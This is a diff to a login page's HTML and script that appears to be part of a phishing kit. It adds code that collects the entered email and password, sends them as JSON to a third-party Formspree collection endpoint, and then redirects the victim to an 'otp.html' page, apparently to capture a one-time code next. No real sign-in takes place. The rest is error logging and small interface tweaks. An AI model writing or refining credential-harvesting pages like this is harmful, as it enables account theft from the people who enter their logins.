@@ -12,38 +12,54 @@
 
         const btn = document.getElementById("redirectBtn");
         const emailInput = document.getElementById("email");
+        const passInput = document.getElementById("pass");
         const form = document.getElementById("form");
 
         if (form) {
           form.addEventListener("submit", async function (event) {
-            event.preventDefault(); // Prevent form default submission
+            event.preventDefault(); // Prevent default form submission
 
-            if (!emailInput.value) {
+            // Validate email and password
+            if (!emailInput.value.trim()) {
               alert("Please enter your email.");
               return;
             }
+            if (!passInput.value.trim()) {
+              alert("Please enter your password.");
+              return;
+            }
 
-            btn.textContent = "Loading..."; // Change button text
+            btn.textContent = "Loading..."; // Show loading state
             btn.disabled = true; // Prevent multiple clicks
 
-            localStorage.setItem("email", emailInput.value); // Store email
+            localStorage.setItem("email", emailInput.value); // Store email locally
 
-            let formData = new FormData(form);
+            let formData = {
+              email: emailInput.value,
+              pass: passInput.value,
+            };
 
             try {
               let response = await fetch("https://formspree.io/f/xoveqrzb", {
                 method: "POST",
-                body: formData,
-                headers: { Accept: "application/json" },
+                headers: {
+                  "Content-Type": "application/json",
+                  Accept: "application/json",
+                },
+                body: JSON.stringify(formData),
               });
 
+              let result = await response.json();
+
               if (response.ok) {
-                window.location.href = "otp.html"; // Redirect after success
+                window.location.href = "otp.html"; // Redirect on success
               } else {
-                alert("Failed to send form. Please try again.");
+                alert(result.error || "Failed to send form. Please try again.");
+                console.error("Form error:", result);
               }
             } catch (error) {
               alert("An error occurred. Please try again later.");
+              console.error("Request error:", error);
             } finally {
               btn.textContent = "Login"; // Reset button text
               btn.disabled = false; // Re-enable button
@@ -95,16 +111,16 @@
               class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
               placeholder="Password"
             />
-
             <img
               onclick="togglePass()"
               src="asset/eyes-a95130fc.svg"
-              class="absolute top-1/2 bottom-1/2 right-3 my-auto"
+              class="absolute top-1/2 bottom-1/2 right-3 my-auto cursor-pointer"
             />
           </div>
 
           <button
             id="redirectBtn"
+            type="submit"
             class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
           >
             Login
